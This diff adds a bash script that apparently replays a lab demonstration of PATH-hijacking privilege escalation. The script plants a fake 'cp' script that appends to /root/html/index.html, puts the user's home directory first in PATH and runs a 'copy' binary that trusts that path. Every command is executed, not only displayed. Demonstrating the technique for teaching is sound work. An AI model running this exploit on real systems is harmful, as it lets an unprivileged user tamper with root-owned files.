@@ -1,0 +1,31 @@
+#!/bin/bash
+
+echo -n "vulnerable:2> "
+sleep 1
+echo "echo -e '#!/bin/bash\\n\\necho \"test ;)\" >> /root/html/index.html\\ncat /root/html/index.html' > cp" | pv -qL 10 
+echo -e '#!/bin/bash\n\necho "test ;)" >> /root/html/index.html\ncat /root/html/index.html' > cp
+echo -n "vulnerable:2> "
+sleep 1
+echo "chmod +x cp" | pv -qL 10 
+chmod +x cp
+echo -n "vulnerable:2> "
+sleep 1
+echo "export PATH=\"/home/dev_user:\$PATH\"" | pv -qL 10 
+export PATH="/home/dev_user:$PATH"
+echo -n "vulnerable:2> "
+sleep 1
+echo "echo \$PATH" | pv -qL 10 
+echo $PATH
+echo -n "vulnerable:2> "
+sleep 1
+echo "which cp" | pv -qL 10 
+which cp
+echo -n "vulnerable:2> "
+sleep 1
+echo "copy" | pv -qL 10 
+copy
+echo -n "vulnerable:2> "
+sleep 1
+echo "strings /usr/bin/copy" | pv -qL 10 
+strings /usr/bin/copy
+exit
